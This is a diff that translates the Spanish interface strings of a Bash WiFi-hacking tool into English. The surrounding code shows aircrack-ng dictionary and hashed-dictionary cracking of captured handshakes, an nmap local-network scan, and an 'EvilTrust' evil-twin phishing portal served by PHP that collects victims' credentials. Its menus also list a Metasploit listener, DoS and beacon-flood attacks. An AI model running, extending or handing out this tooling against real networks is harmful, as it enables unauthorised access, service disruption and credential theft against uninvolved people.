@@ -200,7 +200,7 @@ handshake_ataque() {
 }
 # salida
 salir() {
-	echo -e "\n${redColour}[*]$grayColour Saliendo y reiniciando la tarjeta de red...\n" 
+	echo -e "\n${redColour}[*]$grayColour Exiting and restarting the network card...\n" 
 	tput civis
 	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
@@ -243,25 +243,25 @@ pkmid_ataque() {
 }
 # 3) ataque
 fuerza_.cap() {
-	clear; echo -e "\n${greenColour}[*]$grayColour Starting Fuerza Bruta"
+	clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
 	sleep 1
-	echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+	echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
 	$cleancolor
 	tput cnorm
-	echo -ne "${blueColour}[?]$grayColour Nombre del archivo .cap: " && read cap
-	tput civis; echo -ne "${redColour}[?]$grayColour Ruta del Diccionario al usar: " && read dicc
+	echo -ne "${blueColour}[?]$grayColour File path .cap: " && read cap
+	tput civis; echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
 
 fuerza_rainbow() {
-	echo -ne "${greenColour}[?]$grayColour Ruta del archivo .cap : " && read cap
+	echo -ne "${greenColour}[?]$grayColour File path .cap : " && read cap
 	cd WifiPwnedd
 	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
 }
 
 rainbowtaibles() {
-	clear; echo -e "\n${yellowColour}[*]$grayColour Iniciando..."
-	echo -ne "${blueColour}[?]$grayColour Ruta del diccionario: " && read ruta
+	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Taibles..."
+	echo -ne "${blueColour}[?]$grayColour Dictionary path: " && read ruta
 	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
 	test -f dicc-hasheado
 	if [ "$(echo $?)" -eq 0 ]; then
@@ -281,17 +281,17 @@ rainbowtaibles() {
 			echo -e "\n${redColour}[!]$grayColour Saliendo"
 		fi
 	else
-		echo -e "\n${redColour}[!]$grayColour No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
+		echo -e "\n${redColour}[!]$grayColour The dictionary could not be created or you have entered the wrong dictionary path"
 		sleep 2
 	fi
 }
 
 menuforce() {
-	clear; echo -e "${yellowColour}\n1) Ataque Fuerza bruta (.cap)"
-	echo -e "2) Crear diccionario hasheado (Rainbow taibles)"
-	echo -e "3) Ataque fuerza bruta con diccionario hasheado"
-	echo -e "4) Salir"
-	echo -ne "${yellowColour}[*]$grayColour Seleccione una opcion: " && read force 
+	clear; echo -e "${yellowColour}\n1) Force Brute .cap"
+	echo -e "2) Create hashed dictionary (Rainbow taibles)"
+	echo -e "3) Force brute with dictionary hashed"
+	echo -e "4) Exit"
+	echo -ne "${yellowColour}[*]$grayColour Attack Force: " && read force 
 	case $force in 
 	1)
 	fuerza_.cap
@@ -303,10 +303,10 @@ menuforce() {
 	fuerza_rainbow
 	;;
 	4)
-	echo -e "\n${redColour}[*]$grayColour Saliendo..."
+	echo -e "\n${redColour}[*]$grayColour Exit..."
 	;;
 	*)
-	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
+	echo -e "${redColour}\n[!]$grayColour Invalid option"
 	sleep 2
 	;;
 	esac
@@ -323,14 +323,14 @@ scanner() {
 	tput civis; echo -e "\n---------------------------------------------------\n"
 	sudo nmap -sP -Pn 192.168.1.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
 	echo -e "\n---------------------------------------------------"
-	echo -ne "${redColour}[!]$grayColour Enter para salir" && read 
+	echo -ne "${redColour}[!]$grayColour Enter to exit" && read 
 	tput cnorm
 }
 menunomon() {
-	clear; echo -e "${yellowColour}\n1) Menu fuerza bruta"
-	echo -e "2) Scanner de la red local"
-	echo -e "3) Salir"
-	echo -ne "${yellowColour}[*]$grayColour Seleccione una opcion: " && read force
+	clear; echo -e "${yellowColour}\n1) Force Brute menu"
+	echo -e "2) Scanner "
+	echo -e "3) Exit"
+	echo -ne "${yellowColour}[*]$grayColour Attack: " && read force
 	case $force in 
 	1)
 	menuforce
@@ -339,10 +339,10 @@ menunomon() {
 	scanner
 	;;
 	3)
-	echo -e "\n${redColour}[*]$grayColour Saliendo..."
+	echo -e "\n${redColour}[*]$grayColour Exit..."
 	;;
 	*)
-	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
+	echo -e "${redColour}\n[!]$grayColour Invalid option"
 	sleep 2
 	;;
 	esac
@@ -429,13 +429,13 @@ eviltrust() {
 
 		if [ $check_plantillas -eq 1 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server PHP...${endColour}"
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
 			popd > /dev/null 2>&1; getCredentials
 		elif [ $check_plantillas -eq 2 ]; then
 			tput civis; pushd $template > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando servidor PHP...${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Starting server PHP...${endColour}"
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
@@ -446,7 +446,7 @@ eviltrust() {
 			popd > /dev/null 2>&1; getCredentials
 		else
 			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $template${endColour}\n"; sleep 1
 			pushd $template > /dev/null 2>&1
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
@@ -515,7 +515,7 @@ else
 			tput civis; $cleancolor
 				while true; do
 				clear
-				echo -e "${purpleColour}\n[+]$grayColour Menu de ataques\n${endColour}"
+				echo -e "${purpleColour}\n[+]$grayColour Attack Menu\n${endColour}"
 				echo -e "${redColour}"
 				echo -e "   #"
 				echo -e "    #	                             ( ( \ )  ( / ) )"
@@ -528,14 +528,14 @@ else
 				echo -e "${greenColour}\n[+]${grayColour} Network card: $tar"
 				echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-				echo -e "${yellowColour}\n[1] Handshake Attack\t\t[6] EvilTrust (S4vitar)\t[7] Fuerza bruta .cap"
+				echo -e "${yellowColour}\n[1] Handshake Attack\t\t[6] EvilTrust (S4vitar)\t[7] Force Brute .cap"
 				echo -e "[2] PMKID Attack\t\t\t\t\t[8] dicc-hasheado (Rainbow taibles)"
 				echo -e "[3] DoS Attack"
 				echo -e "[4] Beacon Flood Attack"
 				echo -e "[5] Scanner"
-				echo -e "\n[9] Salir\n"
+				echo -e "\n[9] Exit\n"
 				tput cnorm
-				echo -ne "${blueColour}[?]${grayColour} Seleccione un ataque: " && read opcion
+				echo -ne "${blueColour}[?]${grayColour} Attack: " && read opcion
 				$cleancolor
 				case $opcion in
 				1)
